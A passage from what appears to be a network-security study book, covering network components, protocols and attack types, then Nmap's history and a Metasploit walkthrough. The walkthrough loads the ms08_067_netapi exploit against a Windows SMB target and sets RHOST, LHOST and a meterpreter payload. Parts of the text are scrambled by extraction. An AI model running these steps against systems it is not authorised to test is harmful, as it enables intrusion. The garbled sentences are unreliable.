traditional IP routing process. The best part: MPLS can be used to manage  protocols  that  are  not  part  of  the  TCP IP  protocol  suite  or even compatible with the suite itself.  VoIP Voice over IP is defined as a tunneling mechanism that can move data  or  voice  over  a  TCP IP  network.  Not  only  has  it  been considered to be an excellent replacement for PSTN over computer networks but it also can be used on smartphones. Important options such as videoconferencing and remote collaboration on projects are available  with  VoIP.  That  said,  certain  VoIP  solutions  are  meant  to replace telephone handsets or to be used as software. Skype is one example of the latter.  iSCI Considered  to  be  a  low-cost  alternative  to  FCoE,  iSCI  is  a network  storage  standard  that  is  based  on  IP.  You  can  use  this location-independent technology to store, retrieve and transmit files over LAN, WAN among other internet connections.  Software-Defined Networking Software-defined  networking  provides  a  new  take  on  network operation, design, and maintenance. Organizations have to deal with certain limitations when it comes to network design and which is why they  have  no  choice  but  to  stick  with  one  vendor.  However,  with SDN,  the  control  layer   network  service  of  data  transmission management   and  infrastructure  layer   hardware  and  hardware settings  are separated. Also, since SDN can be programmed from a central  location,  the  advantages  that  it  offers  include  being  open standards-based,  vendor-neutral  and  flexible.  Most  of  all,  with  this type  of  network,  organizations  can  use  hardware  of  their  choice based  on  benefits  such  as  top  throughput-rated  or  cost-effective devices.  Wireless Networks   Even  if  wireless  networking  was  difficult  for  the  security  threats that it posed at first, its popularity soared among users. Over time, with the development of security, this became less of a problem and security professionals began to adopt wireless networking. So, let’s look at a number of concepts pertaining to wireless networks.  WLAN & Cellular Techniques While varying voltages signify the zeros and ones but data sent over  a  wired  network,  this  is  represented  by  radio  waves  over  a wireless network. Termed as modulation, here are a few techniques used to transmit data over both WLANs and cellular networks.  WLANs The   four  common   techniques  used  over  WLANs   include Frequency  Hopping  Spread  Spectrum,  Direct  Sequence  Spread Spectrum,  Orthogonal  Frequency  Division  Multiplexing,  and Vectored Orthogonal Frequency Division Multiplexing. While the first two were part of the original 802.11 standards, the latter two are far more advanced forms of modulation. The last one was developed by Cisco.  Cellular Networks The  five  techniques  used  for  modulation  over  cellular  networks include  Frequency  Division  Multiple  Access   FDMA ,  Time  Division Multiple  Access   TDMA ,  Code  Division  Multiple  Access   CDMA , Orthogonal  Frequency  Division  Multiple  Access   OFDMA   and Global System for Mobile Communications  GSM . While TDMA was an  improvement  over  FDMA,  CDMA  allows  calls  to  use  all frequencies  by  spreading  data  across  the  spectrum.  OFDMA improves  FDMA  and  is  commonly  used  for  4G  cellular  devices. Finally, GSM offers a cell phone with a SIM card that has to remain on the phone for it to work. Secret cryptography is used to prevent cell phone cloning.  Satellites   Satellites can not only provide television programming services to users but also the internet through the use of microwave technology. While  they  can  be  slow  compared  to  other  types,  this  type  of technology  is  very  useful  in  remote  locations  where  no  other solutions can be implemented.  WLAN Structure Before we can look at WLAN standards, it’s a good idea to get an  idea of WLAN components and overall structure.  Access Point This  wireless  transmitter  and  receiver  are  connected  with  the wired  portion  and  is  an  acceptable  point  to  the  network  for  wired devices. Routers are common examples. These days, “thin” access points  resemble  antennas  that  can  be  connected  with  a  central system called controllers.  SSID This  name  or  value  is  used  to  distinguish  a  WLAN  from  other WLANs. It can be hidden or broadcast by the access point. Hiding the  SSID  is  not  a  competent  security  strategy  since  it  merely removes  the  beacon  frame.  Since  other  frames  also  exist,  the discovery of the existence of a wireless network can be “sniffed.”   Infrastructure vs. Ad Hoc Mode Since  a  WLAN  has  to  contain  one  AP,  all  communication between stations and devices will have to be routed through the AP and  is  called  the  Infrastructure  mode.  The  Ad  Hoc  mode  is  where stations  and  devices  can  communicate  with  each  other  directly without the need for the AP. WLAN Standards The 802.11 Standard The 802.11 standards have been around for a while. There have been several amendments made to this standard but are sometimes   regarded  as  separate  ones.  These  include  802.11a,  802.11b, 802.11c, 802.11f, 802.11g & 802.11n.  Bluetooth This  wireless  technology  can  be  used  to  create  personal  area networks  between  devices  and  peripherals.  Bluetooth  3.0  and  4.0 can function at speeds 24 Mbps. Bluejacking and bluesnarfing where unauthorized message and access takes place.  Infrared This  short-distance  wireless  technology  uses  light  instead  of radio  waves  and  requires  both  devices  to  have  an  infrared  port.  It can operate at a range of 5 meters at a speed of up to 4 Mbps. The IrTran-P  protocol  can  cause  security  issues  as  it  accepts  files automatically.  Near Field Communication  NFC  Two communication devices, when brought as close as 2 inches to  each  other,  can  be  used  to  make  payments  or  read  electronic tags. One of these two devices is usually a mobile device.  WLAN Security In  order  to  implement  802.11  technologies  safely,  you  must understand  the  security  measures  that  have  been  developed  and used over time. Open System and Shared Key Authentication were legacy  authentication  methods  used  while  three  security measures  for  wireless  networks  include  WEP,  WPA,  and  WPA2. WPA2 is considered to be much more secure since it is based on the CCMP protocol compared to the TKIP protocol used in WPA.  the   MAC Filter This  security  measure  includes  the  addition  of  MAC  Addresses that are allowed to access to the AP. Still, MAC addresses can be spoofed and which is why this isn’t such a good security measure. That said, you can blacklist or deny particular devices access to the AP.   Cryptography   Used   to   Maintain  Communications Security There  are  two  types  of  protection  available  depending  on  the level  of  communication  that  you  would  like  to  use.  First,  link encryption repeatedly encrypts and decrypts all information sent as part of data transmission while end-to-end encryption only encrypts the  internal  information  sent  but  not  the  packet  header  information that is necessary for routing.  Link Encryption As  mentioned  earlier,  all  data  is  encrypted  in  this  type  of  data transmission with the exception of the data-link control information. As it moves along its route to the destination host, each router at a certain  point  decrypts  the  information  in  order  to  obtain  header information for its destination and encrypts the information again.  institutions  have   to  communicate  with   As a person sending data over the internet, either by email or in which  banking  their customers, then link encryption is preferred. This is because all data is encrypted and provides privacy and security. On the downside, all devices  the  data  passes  through  must  receive  the  key  and  key changes if necessary. Apart from this, the decryption of the packet at each  routing  point  has  to  take  place  in  order  for  it  to  move  further along the route.   End-to-End Encryption In this type of encryption, encryption of the data is restricted to everything apart from packet headers and addresses. This makes it more  susceptible  to  hackers  who  can  gain  more  information  about packets  by  sniffing  or  eavesdropping.  Still,  end-to-end  encryption allows for users to have control over what gets encrypted or not. In addition, since there is no repeated decryption or encryption at each routing  point,  the  performance  of  routing  devices  improves  greatly. IPSec is one such example of end-to-end encryption.  Actively Secure Network Components   There’s  an  important  reason  why  network  components  must  be secured along with protecting data in transit. This is for the simple reason  that  if  compromised,  the  information  in  the  network  can  be easily accessed by attackers. In other words, both matters.  Hardware So, what do we mean by network components? This  can  be  classified  into  five  parts:  hardware,  transmission media, network access control devices apart from endpoint security and content-distribution networks and which we will look at next.  Modem Serving as a portmanteau for modulator demodulator, the modem gives  remote  users  access  to  a  network  by  means  of  an  analog phone line. When the user sends an analog signal to the modem, it is converted to a digital signal that is usually sent to a server. As a result,  when  the  server  responds  to  the  signal,  the  digital  signal  is converted back to analog and sent back to the remote user.  While this can prove to be useful for those who find themselves traveling  on  work,  this  type  of  access  can  give  attackers  a  way  in while security personnel are busy protecting the Internet gateway.  While  not  allowing  modems  to  be  placed  on  the  network  is  a common  approach  to  prevent  threats,  telephony  firewalls  are  also used  and  monitor  both  incoming  and  outgoing  analog  calls.  As  a result, online certain numbers can be used to make modem calls into the organization’s phone exchange.  That said, the telephony firewall mentioned earlier is much like an IP  firewall  where  it  sits  between  the  PSTN  and  the  organization’s telephone network.  Bridges and Switches Local area networks have been known to grow in size and which not  only  reduces  bandwidth  but  reaches  a  point  where  the  LAN cannot expand anymore.   Increasing  the  cable  length  and  the  size  of  the  LAN  will  only increase  attenuation.  Is  there  a  way  to  connect  two  LANs  without reconfiguring both networks?  The common solution to this is called a Layer 2 device known as a bridge and that is responsible for filtering traffic between segments by virtue of their MAC Addresses. Also, they amplify the signal while also reducing the amount of unnecessary traffic flowing through each part of the network too.  Unfortunately,  despite  being  efficient,  bridges  do  not  prevent someone from any of the segments on the network from intercepting traffic. So, security must be taken seriously in the form of link-layer encryption and even access lists. This is particularly true for wireless bridges.  As for switches, they offer the same benefits as bridges do but are expensive. Put simply, they are multiport devices that LANs can connect  to  and  also  come  with  the  additional  benefit  of  increasing network  bandwidth.  That  said,  both  bridges  and  switches  can forward broadcasts to all segments in the network.  Routers The primary function of routers is to forward packets to another network  by  virtue  of  the  IP  address  that  is  added  in  the  packet  it receives. Since routers maintain a certain view of the network they’re in by means of the routing table, they then decide which device on the  network  should  receive  this  packet  next.  This  is  commonly known as the next hop. Of course, if the destination IP address is not located  within  its  network,  it  forwards  the  packet  to  another  router that is closer to its destination. One advantage of using a router is that  it  connects  networks  of  different  types  through  which  you  can send packets of data without any issues.  Wireless Access Points By  definition,  a  wireless  access  point  gives  wireless  devices access to a network. Divided into cells, this area can expand outside the  secure  area  if  wireless  access  point  strength  is  not  adjusted appropriately.  Some  of  the  strategies  used  here  include  shielding,   noise  transmission  and  placing  the  access  point  itself  to  prevent attackers from accessing the network.  Transmission Media The importance of cables used in the design of a network cannot be  overstated.  Picking  the  right  type  of  cable  for  the  said  network can  determine  whether  the  network  succeeds  in  performing  its function. Some of the aspects that must be taken into consideration when  selecting  cables  are  throughout  distance  between  devices, data sensitivity, and the environment.  As  for  the  type  of  cables  available  for  selection,  they  include shielded and unshielded twisted pair, coaxial cable, patch panel and three types of fiber optic cables.   Wired As mentioned earlier, cables that you can select involve twisted pair and coaxial cables where copper wires are twisted together so as to prevent electromagnetic interference and crosstalk. Since this type is the most inexpensive, it is easily bent during installation. So, in order to resolve this, the shielded twisted pair cable is generally used and which adds an extra shield to protect the signal along with the  usual  protective  jacket  used.  Of  course,  since  it  is  more expensive and harder to bend when installing, this can prove to be disadvantageous  not  unless  shielding  the  signal  is  the  maximum priority.  As for coaxial cables, they protect a sizeable conductor which is then covered by a grounding braid of wire and which is separated by a  non-conducting  layer.  In  addition,  a  protective  sheath  is  used  to cover the entire cable. Since the coaxial cable is larger than twisted pair cables, it usually supports a larger bandwidth apart from being installed across larger distances. Intruders cannot monitor the signal while interference is blocked out by the superior protective sheath. Still,  given  how  expensive  it  is,  it  is  only  used  in  specialized applications.   Wireless There  are  two  types  of  wireless  transmissions  include  radio waves and microwaves. Some applications that we have looked at in an earlier chapter to transmit wirelessly include Bluetooth, Infrared, Wi-Fi and wireless transmission using satellites.   Fiber Even if cables continue to be used in fiber optic cables, the use of light  instead  of  changing  voltages  when  using  copper  cables.  An LED or laser is used to direct the data and which turns on and off to send  zeroes  and  ones.  The  receiver  at  the  other  end  of  the  cable then  interprets  these  bits  and  converts  them  back  to  the  original signal.  Now, the faster the laser fluctuates, the greater the possibility of the  light  signal  dispersing.  For  this,  light  strengtheners  are  used much like repeaters are. Three types of fiber optic cables are used namely single-mode, multi-mode and plastic optical fiber  POF .  Network Access Control Devices By  definition,  network  access  control  devices  generally  inspect devices that want access to an organization’s network. Whether they already have malware on them, are missing security updates among a host of other issues; this could affect the network as a whole and must  be  dealt  with  in  real-time.  Of  course,  the  acceptable  security standards that grant device access to the network has to be based on the organization’s security policy. Network access control devices  NAC  tend to act as an automated detection and response system that have been placed so as to prevent severe damage to a network or a data breach. Firewalls Defined as a network device that controls traffic and that serves as a barrier between the Internet and a private network, a firewall is used  to  filter  traffic  based  on  rules  set  and  which  distinguishes between  what  the  organization  deems  as  malicious  or  authorized traffic.   Not  only  are  they  capable  of  blocking  unrequested  traffic  and connection  requests  from  outside  the  network  but  they  can  also safeguard  the  structure  and  addressing  scheme  of  a  network  from outside threats.  While these firewalls are not able to block malicious code, most companies  that  offer  such  protection  also  offer  intrusion  detection systems  such  as  antivirus  scanners  apart  from  detailed  logging, monitoring and auditing capabilities.  -  static-packet   Having said that, there are three types of firewalls that are used by  security  professionals  filtering,  circuit-level gateway,  and  firewalls.  While  static-packet  filtering  only  examines the information provided in the packet header, firewalls look at a lot more information so as to filter out unauthorized traffic. Circuit-level gateway  firewalls  established  connections  between  two  trusted partners based on the circuit and not traffic content between these two entities. Proxies The fourth type of firewall that is commonly used includes that of the  application-level  gateway  and  which  is  commonly  known  as  a proxy. Even if it does affect performance, a proxy protects the source and destination IP addresses so as to hide the identity of the private network.  This  is  done  by  copying  packets  from  one  network  to another  which  will  be  inspected  and  processed  as  each  packet passes  through  the  firewall.  These  application-layer  firewalls  are called so because they operate at the Application Layer of the OSI Model.   Endpoint Security In  the  past,  network  security  depended  on  network  border sentries such as firewalls, proxies, virus scanners among a host of IDS,  IPS,  and  IDP  solutions.  Over  time,  this  was  discarded  since threats not only stem from the outside but inside the network as well. It is for this reason that the practice of endpoint security has been adopted  where  each  and  every  device  is  responsible  for  its  local   security.  Another  reason  why  this  makes  much  sense  is  that  any network  is  only  as  secure  as  its  weakest  element.  In  other  words, whether a threat exists on the border, on a server or even a client should be deemed a threat to the entire network.  Content Distribution Networks Also known as a content delivery network  CDN , it is a system of servers  located  at  various  data  centers  with  the  objective  of providing  content  to  users  and  where  the  standards  of  high availability and performance are met. A lot of the content available on  the  internet  today  is  part  of  a  CDN.  Some  of  these  include downloadable  objects,  streaming  media,  web  objects,  and applications.  In being around for almost two decades, CDNs have proved to be successful  when  it  comes  to  promoting  verticals  such  as  gaming, eCommerce,  media  and  entertainment,  and  software  download delivery. An excellent example of a CDN is Amazon CloudFront and Microsoft  Azure  CDN.  Of  course,  viewers  can  easily  access  this content  due  to  its  availability  at  several  data  centers  across  the world.  Design  and  establish  secure  communication  channels.  Data  is rather easy to secure when at rest. When it is in transit, there are a variety  of  threats  and  vulnerabilities  that  can  affect  its  availability, confidentiality, and integrity. Still, all of these security issues can be handled since the purpose of communications security is to detect, mitigate and rectify transportation errors.  In  order  to  do  this,  identifying  the  types  of  communication channels is the first step. Since the voice, multimedia collaboration, remote  access,  data  communications,  and  virtualized  networks  are common  channels  used  in  organizations,  we  will  understand  how they work apart from looking at countermeasures for each of these channels.  Network and Protocol Security Mechanisms   Since  we  are  talking  about  data  in  transit,  the  TCP IP  protocol suite is the one that is used most over the Internet. Still, it’s a known fact  that  there  are  security  deficiencies,  which  is  why  a  number  of protocols,  mechanisms,  and  applications  have  been  developed  to continue protecting transmitted data.  Broadly classified as Security Communication and Authentication protocols, we will look at the most common protocols when it comes to securing transmitted data.  Secure Communication Protocols Some  protocols  have  been  developed  so  as   to  secure application-specific  communication  channels.  Even  if  there  are several that are used in conjunction with the TCP IP protocol suite, some of these include Simple Key Management for Internet Protocol  SKIP , Software IP Encryption  swIPe , Secure Remote Procedure Call  S-RPC , Secure Sockets Layer  SSL , Transport Layer Security  TLS  and Secure Electronic Transaction  SET .  Both SKIP and swIPe are Layer 3 protocols while SSL and TLS protect communications between a web browser and server. As for S-RPC,  this  prevents  unauthorized  code  execution  on  remote systems.  Finally,  SET  was  designed  to  ensure  secure  transactions over the internet.  Authentication Protocols As is normal, once a connection is generally established between a server or network and a system, authentication is the next step to establishing  the  identity  of  the  remote  user.  How  these  logon credentials  are  exchanged  and  whether  they  are  encrypted  varies from protocol to protocol.  There  are  three  protocols  that  are  commonly  used  such  as Challenge  Handshake  Authentication  Protocol   CHAP ,  Password Authentication  Protocol   PAP   and  Extensible  Authentication Protocol  EAP . While CHAP encrypts the username and password, PAP does not. On the other EAP serves as a framework rather than   as an authentication protocol itself since it offers customized security solutions such as smart cards, tokens, and biometrics.  There are newer security protocols that have emerged from these three such as Protected Extensible Authentication Protocol  PEAP  and Lightweight Extensible Authentication Protocol  LEAP . Between EAP, PEAP, and LEAP, PEAP is preferred.  Voice Even  if  voice  communication  doesn’t  directly  fall  under  IT security,  technologies  like  VoIP  that  send  packets  of  data  over  the network is susceptible to interception, it’s necessary to ensure that mechanisms are put into place in the best of security and integrity.  Of course, there’s even PBX, PSTN and POTS systems that are prone to tapping, interception as well as eavesdropping but this can be sorted by protecting the physical cabling itself. As for the cabling that  is  outside  your  organization  network,  the  phone  company  that you lease the line from has to.  VoIP This  technology  converts  audio  into  data  packets  that  are  sent over  a  TCP IP  connection.  It  has  become  popular  given  that  it  is inexpensive  as  a  telephony  solution.  Still,  there  are  a  number  of ways by which VoIP can be attacked in a variety of ways. Falsifying Caller  IDs,  spoofing  call  managers  through  Man-in-the-middle attacks,  OS  or  DoS  attacks  and  even  802.1X  authentication falsification  is  very  possible.  For  that  matter,  if  the  packets  aren’t encrypted people can just listen in.  Multimedia Collaboration Another  common  communication  channel   in organizations involves multimedia collaboration and consists of two types: remote meetings and instant messaging.  is  used   that   Remote Meeting   By definition, this type of communication channel allows people to conduct virtual meetings by virtue of the internet. In most cases, a browser  extension  is  installed  on  the  host  computer  while  allowing for desktop sharing and remote control.  When  using  such  software,  authentication  and  encryption  is  a must.  Having  security  professionals  look  into  this  is  vital  while  the person who moderates these meetings should be trained on how to use these applications safely. Instant Messaging There’s  no  doubt  that  instant  messaging  makes  communication much easier. Especially in real-time too. Still, there are security risks that  come  with  such  applications  given  that  they  use  peer-to-peer, brokered or server-oriented systems. In other words, based on the application  that  is  used,  permission  must  be  given  to  certain protocols  as  a  result.  Protocols  such  as  Internet  Relay  Chat   IRC  and Extensible Messaging and Presence Protocol  XMPP  come to mind.  As  for  threats,  not  only  can  user  identification  be  falsified  but users  can  also  execute  malicious  scripts  that  can  render  their systems  insecure.  In  addition,  since  file  transfer  options  are available,  there  every  chance  of  system  infection  as  well.  In  some cases,  its  users  can  be  victims  of  packet  sniffing  or  even  social engineering  attacks.  Spam  over  instant  messaging  is  another method  of  attack  and  which  is  why  it  is  considered  to  be  insecure from an organizational standpoint.  Remote Access If  you’ve  heard  of  the  word  ‘telecommuting’,  you’d  know  that employees  today  have  the  ability  to  access  organization  resources right from the comfort of their own home. As if they are sitting in the office itself. Simply put, giving someone remote access will involve a distant client gaining access to a network.  So, how does the telecommuter connect to the network? Given that there are a number of remote connection technologies, security professionals must also keep in mind the security issues that come   with  these  types  of  connections  and  of  which  Dial-up,  ISDN,  DSL, Cable, and VPN are the most common.  Since  interception  and  eavesdropping  are  very  common  here, establishing a secure communication channel through encryption is vital  here.  Apart  from  this,  only  allowing  certain  people  remote access  and  being  stringent  with  authentication  is  just  as  important here.  Apart  from  this,  people  who  are  working  remotely  might  also need help from time to time. So, using the authentication and secure communication  protocols  discussed  earlier  or  even  a  centralized remote authentication service such as RADIUS and TACACS+ can be useful here.  That said, when it comes to dial-up connections, PPP is the most  commonly used protocol that has replaced SLIP.  About VPNs A  virtual  private  network  is  a  connection  that  might  use  an untrusted  communication  network  to  transmit  data  but  is  protected by  strong  authentication  protocols  and  encryption  mechanisms  in place. In other words, entire protocols wrap around each other be it a LAN,  line,  encryption  or  authentication  protocol.  PPTP,  L2TP,  and IPSec  are  protocols  to  provide  encryption, authentication or both.  that  are  known   VPN Screen Scraper One  security  risk  that  crops  up  when  giving  remote  access involves that of screen scraping. By definition, it is the ability of an attacker to scrape the screen and access sensitive information on. For this screen scraping encryption, solutions must be implemented.  Virtual Application Desktop The  Virtual  Application  or  Desktop  is  another  communication channel that is growing in popularity and which gives remote users the ability to execute commands as if they were sitting at the terminal that they are accessing remotely. Since security plays an important role  here  too,  security  professionals  must  implement  the  same   security measures on both the host computer as well as the virtual machine.  Virtualized Networks Virtualized networks are able to simulate traditional networks by combining  both  hardware  and  software  network  resources  into  a single software entity that offers administrative functionality. Not only do these implementations speed up recovery times but also improve security.  Virtual  SANs,  SDNs,  guest  operating  systems  and  port isolation are some of the virtualization network types.  Virtual SAN A virtual storage area network not only allows for the pooling of storage but also provides capabilities that include the automatic and instant  allocation  of  virtual  machine  storage.  Considered  to  be  a method  of  software-defined  storage,  the  availability  of  data  is determined by the software and not the hardware here. As a result, policies can be put into place for the software to decide where the data  should  be  placed.  This,  in  turn,  support  data  availability  and protection compared to hardware-only options.  SDN Software-defined networking is an approach that cuts IT costs by virtue  of  policy-enabled  workflow  automation.  Not  only  does  it separate the network control plane from the forwarding plane but it also  manages  to  network  traffic  into  three  components:  raw  data, data  transmission  and  data  purpose.  An  SDN  consists  of  three architecture layers such as the infrastructure, control and application layer. As a result of these layers, the hardware will not have to direct the traffic.  Guest Operating Systems and Port Isolation If  an  organization  decides  to  implement  virtual  networking, access to guest operating systems might be necessary. In this case, configuring a private LAN might help of which the first one created is the primary LAN. You can create others too and which will be known   as secondary LANs. The secondary LAN can be configured in three modes:  promiscuous,  community  or  isolation  mode.  The  nodes within this PVLAN will have communication restrictions imposed on it based  on  which  mode  it  is  in.  That  said,  the  activity  of  using  a PVLAN is called port isolation.  Prevent or mitigate network attacks If  you  wish  to  deal  with  network  attacks,  the  first  step  is  to understand  the  types  that  commonly  occur  and  how  they  can  be dealt with.  Even better is when you are able to prevent these kinds of attacks in the first place. That said, even though cabling is said to be far more secure, it still comes with its set of problems and which can affect availability.  Cabling Noise,  attenuation,  and  crosstalk  are  common  problems  that affected  bounded  networks.  While  shielded  cabling  can  protect  the network  from  noise,  following  the  length  recommendation  for attenuation whether this pertains to coaxial, twisted pair or fiber optic cables work just as well. Crosstalk is a problem that affects twisted pair cables and can be solved by twisting the cables properly. That said, eavesdropping can occur on bounded media but are easier to solve.  Since  fiber  optic  cables  use  light  instead  of  voltage  for  the signal, it can increase the difficulty of eavesdropping significantly. But what can really improve security is ensuring the physical security of these cables.  Network Component Attacks The  reason  why  attacks  on  network  components  take  place  is that  they  are  shared  by  several  organizations.  It  is  vital  for  the security professional to understand what each of these attacks.   Some of the most common attacks include Non-Blind Spoofing, Blind  Spoofing,  Man-in-the-Middle  Attacks,  MAC  Flooding  Attack, 802.1Q and Inter-Switch Link Protocol  ISL  Tagging Attack, Double- Encapsulated 802.1Q Nested VLAN Attack and ARP Attacks.   ICMP Attacks As we learned earlier that ICMP is a protocol that is used in the Internet layer of the TCP IP suite. Used by routers and other network devices,  its  function  is  to  send  error  messages  or  operational information pertaining to the unavailability of a service, host or router. Diagnostic tools such as ping and traceroute that uses this protocol are  generally  used  by  attackers.  Common  attacks  as  classified  as ICMP  attacks  include  the  Ping  of  Death,  Smurf,  Fraggle,  ICMP Redirect, Ping Scanning, and Traceroute Exploitation.  While  some  of  these  attacks  look  for  information  related  to packets  and  IP  addresses,  others  use  the  ICMP  protocol  to overwhelm systems. Among the lot, the DoS and DDoS attacks have made the news for the mayhem that they cause.  One  smart  measure  to  deal  with  such  an  attack  is  to  block  the protocol number for ICMP which is 1. Some firewalls will allow you to block a particular type of ICMP message too.  DNS Attacks DNS plays an important role in the network for being responsible for resolving IP addresses to computer and domain names. If DNS servers are targeted through DoS or DDoS attacks, it can cause a lot of chaos. Having multiple DNS servers can come in handy in case something goes wrong.  Some of the common DNS attacks include DNS Cache Poisoning, DoS, DDoS, URL Hiding, Domain Grabbing, and Cybersquatting.  Whether  this  involves  redirecting  traffic  from  sites  so  as  to harvest  information  or  even  bring  the  network  to  a  halt,  your  DNS server is the target of such attacks. In the case of domain grabbing, it’s  really  up  to  the  management  to  purchase  sites  associated  with names before anyone else does.   Email Attacks Since  email  is  a  common  tool  that  we  use  every  day,  this  has become  a  preferred  source  of  an  attack.  In  order  to  counter  these attacks, this really stems from poor security practices on the part of   the user. Some of the common email attacks include Email Spoofing, Phishing, Spear Phishing, Whaling, and Spam.  When it comes to spoofing and phishing, the objective is to obtain usernames  and  passwords.  In  the  case  of  whaling,  the  stakes  are even higher since the target is a person of importance. Spam, while being annoying, should still be safeguarded against as it is illegal to send people these types of emails today.   Wireless Attacks Given  how  difficult  it  is  to  find  out  when  someone  is  capturing data packets that are sent out as radio waves, preventing wireless attacks can be difficult to resolve. There are two common types of wireless attacks namely wardriving and warchalking.  Both of these involve finding vulnerabilities on wireless networks and which usually occur one after the other. Just because someone cannot become a wireless client on a network, this won’t stop them from looking for valuable information.  Remote Attacks This  type  of  attack  focuses  on  certain  remote  systems  such  as VPN  servers  or  as  in  the  past,  dial-up  servers  but  which  have stopped as security practices improved. One example of the latter is war  dialing  where  software  created  will  dial  out  to  a  big  list  of numbers in order to find numbers associated with modems. If it is a telephone or a fax number, the answer will be recorded. However, if it is a modem, a connection attempt will be made leaving the network open for the attacker. Other Attacks Now, there’s a final list of attacks that don’t necessarily make it to any  of  these  categories.  These  attacks  include  SYN ACK  attacks, session hijacking, port scanning, teardrop and IP Address Spoofing. While  SYN ACK  attacks  serve  as  a  type  of  DoS  attack,  the session  hijacking  attack  attempts  to  collect  all  data  sent  to  a particular system. Port scanning involves looking for open ports and   which  can  then  be  used  for  attacks.  While  teardrop  is  a  kind  of packet fragmentation attack, IP address spoofing involves attackers who  want  to  hide  their  trail  or  even  carry  out  actions  as  another computer.   Chapter 4 – Linux Tools  Nmap  was  first  published  in  the  online  magazine  Phrack Magazine  in  September  1997,  created  by  Gordon  Lyon   under  the pseudonym Fyodor Vaskovich .  This  first  version  appeared  without  number  since  no  new publications of the tool had been planned. Given its popularity and high demand, new versions were published  call v1.25 came out only 4 days later  and on December 1998, version 2.00 was published.  In April 2000, version 2.50 emerged, which included ACK scans. In December of the year 2000, the first version for Windows  Nmap v2.45Beta16  was published thanks to the work of Ryan Permeh and Andy Lutomirski. In August 2002 the program code is rewritten and it goes  from  C  language  to  C  ++  language  and  support  for  IPv6  is added. In February 2004, version 3.50 is published, which includes packet tracking and UDP ping. During the summer of 2005 additional tools  such  as  Zenmap,  Ncat  and  NSE  arise  Version  3.90,  in September  of  that  same  year,  includes  ARP  scanning  and  MAC address  spoofing.  A  special  version   4.85beta5   was  released  on March  30,  2009,  to  detect  the  Conficker  worm,  which  had  infected millions  of  computers.  On  January  28,  2011,  version  5.50  is published,  which  includes  the  generation  of  nping  packages,  in addition  to  a  larger  number  of  NSE  scripts.  In  May  2012,  version 6.00 came out with full IPv6 support.  Impact Nmap was developed as a scanner for basic networks, but each new version adds even more features and its community grows day by day.  Nmap  is  considered  one  of  the  most  important   and  essential  tools for system administrators, security auditors, and hackers. This is due to a large amount of information that is able to obtain from a network in an effective  and stealthy  way.   Curiosities Nmap has been seen in movies like Battle royale, 13: Game of Death,  Matrix  Reloaded,  The  Crystal  Jungle  4  or  the  Bourne Ultimatum.  The  operating  systems   as  well  as  any  other  software  are not perfect, in fact, there are operating systems that carry long errors  and  vulnerabilities.  This  creates  a  big  problem  since  an assailant  is  able  to  locate  these  failures  and  capitalize  on  their benefit.  To  test  vulnerabilities  in  our  equipment  we  will  perform  pentest  penetration tests  against our systems with the Metasploit program.  Metasploit is a framework that allows you to develop, configure and execute exploits 1 against objective systems in order to make a proper pen-testing.  It contains more than 900 different exploits, mostly from Windows operating systems, although there are also for MacOsX and Unix   Linux.  In  addition  to  the  exploits,  it  contains  2  payloads  to  take advantage of them, libraries and various interfaces that we can use in our attacks.  It  is  written  in  the  Ruby  programming  language  and  is  free  software. You can find versions for both Linux and Windows.   1   Exploit:  software  that  attempts  to  exploit  a  vulnerability  in  a   2   Payload:  software  that  allows  you  to  take  advantage  of  system to compromise it  compromised computers.  B operation to SICO We  will  use  the  Msfconsole  environment  since  it  is  the  most complete and most used we can see the options of this by typing in the console the help command.  If  we  use  the  Metasploit  database,  we  can  find  in  the  menu  Applications Kali   Kali Linux >> Applications >> System Services >> Community >>  Metasploit Pro Start  At the beginning we should collect information from the objective system,  this  first  stage  is  usually  called  the  recognition  stage,  with which  we  will  obtain  the  necessary  data  to  make  the  appropriate decisions based on what we have found.  Since  we  have  already  studied  tools  that  are  more  suitable  for this purpose  nmap , we will use this program to find the hosts, their operating  system  and  their  services.  We  can  do  it  directly  from Metasploit,  using  the  db_nmap  command,  which  has  an  operation similar  to  that  of  nmap   uses  the  same  parameters .  Once  the  IP addresses, services, ports, etc. are obtained, we can decide where we want to attack.  If we want to see the exploits available in our Metasploit we will proceed  to  write  the  option  show  exploits.  We  will  be  shown  a  list with all the exploits that we can use, hence the importance of having updated our Metasploit Framework, since with each update there is usually an increase in the number of exploits that you can use.  We are shown a list of exploits as well as a brief description, a  ranking and the operating systems it attacks.  msf> show exploits Exploits ======== Yam Disclosure Date Rank Description It  is  also  possible  to  search  the  exploit  using  the  search command. This command also serves to find other resources. Once we  have  chosen  the  exploit  we  want  to  use,  we  will  write  the command – use [exploit] to indicate Metasploit the exploit to activate.  As an example, we will use the exploit ms08_067_netapi, so we search through the list of exploits  using the search command  and   find that its full name is windows   smb  ms08_067_netapi.  So we would type the following command: use windows   smb    ms08_067_netapi  If everything goes well  we have written the name of the exploit correctly   metasploit  will  show  on  the  console  the  exploit  you  are using in red, indicating that you have managed to load it.  Once  this  is  done,  we  will  proceed  to  use  a  payload  to  take advantage of the exploit. To see a list of payloads compatible with our exploit, we will use the show payloads operation.  msf exploit   ms08_067_netapi  > show payloads  As we can see, metasploit tells us that you are ready to use the payload. If we introduce show options below we will be shown the options that we can use:  msf exploit   ms08_067_netapi  > show options  Automatic Targeting We see that in this case, all the options are necessary  all have the  Required  =  yes  field   as  well  as  most  of  them  already  have  a default value, although we can adjust them to our convenience with the command set [option] [parameters] as we will see next.  We  indicate  the  IP  of  the  target  machine,  as  well  as  ours,  by means of the orders set RHOST [ target ip ] and set LHOST [our IP], as we have seen in the table of options above.  After putting the corresponding IPs, we will use the meterpreter to take advantage of the vulnerability. Once initialized meterpreter we can fully exploit the vulnerability.  How does it work? Metasploit Framework has a modular architecture  which we can see in more detail below  this means that each exploit is integrated into the framework so that it can interact with it  and consequently   with other modules such as payloads  simply by means of load and configuration commands.  Options Here is a list of some of the options available in msfconsole, we can  see  more  specific  information  on  each  option  using  the  -h parameter    Back: Download the current module As  we  see  in  the  example,  the  system  is  not  vulnerable  to  this particular  exploit;  this  is  the  main  objective  to  achieve  when  we update  our  systems,  having  the  least  amount  of  vulnerabilities possible.

However,  this  Framework  is  very  extensive  and  has  many capabilities, including creating our own exploits and payloads, saving our  attacks  in  a  database,  HIDING  or  n  and  codification  or  n  of exploits...

